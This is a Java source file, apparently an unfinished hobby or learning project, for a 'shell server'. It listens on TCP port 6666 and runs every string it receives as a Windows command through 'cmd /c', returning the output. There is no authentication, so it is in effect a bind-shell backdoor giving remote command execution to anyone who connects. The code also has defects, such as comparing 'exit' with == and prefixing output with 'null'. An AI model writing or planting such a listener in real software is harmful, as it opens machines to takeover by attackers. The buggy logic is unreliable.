/*
未完
java shell
server
*/
import java.io.*;
import java.net.*;


public class ShellServer {
	public static void main(String[] args) {
        String inputShellCode="";
        try {
            System.out.println("server RUN");
            ServerSocket ss = new ServerSocket(6666);
            runShellCode(ss);

    } catch (Exception e) {
        // TODO: handle exception
        System.out.println(e.getMessage());
    }

}

    private static void runShellCode (ServerSocket ss) {
        String inputShellCode="";
        InputStream in = null; 
        OutputStream out = null;
        String ret=null;
        boolean flag=true;

            try {
                Socket socket = ss.accept();
                in=socket.getInputStream();
                out=socket.getOutputStream();
                DataInputStream dis = new DataInputStream(in);
                DataOutputStream dos=new DataOutputStream(out);
                /*获取发来的shell*/
                while(flag){
                    inputShellCode=dis.readUTF();
                    System.out.println("获取到的代码："+inputShellCode);
                    if(inputShellCode =="exit"){
                        flag=false;
                        dos.close();
                        dis.close();
                        socket.close();
                    
                    }
                    /*运行shell*/
                    inputShellCode="cmd /c "+inputShellCode;
                    Process process = Runtime.getRuntime().exec(inputShellCode);
                    int status = process.waitFor();
                    System.out.println("》"+status);
                    if (status==0){
                        System.out.println("命令执行完成："+inputShellCode);
                        in =process.getInputStream(); 
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
                        BufferedOutputStream bos =new BufferedOutputStream(dos);
                        String line = br.readLine();
                        System.out.println("》"+line);
                        if(line == null){
                            dos.writeUTF("命令未能运行");
                        }else{
                            while(line!=null) {
                                ret=ret+line+'\n';
                                System.out.println(line);
                                line = br.readLine();
                            }
                            dos.writeUTF(ret);
                        }
                        ret=null;
                        
        
                    }else{
                        System.out.println("命令未能运行:"+inputShellCode);
                        dos.writeUTF("命令未能运行");
                    }
                    
                }
                /* dos.close();
                dis.close();
                socket.close(); */
    
                System.out.println(ret);
                } catch (Exception e) {
                    //TODO: handle exception
                    e.getLocalizedMessage();
                }
        

    }

}
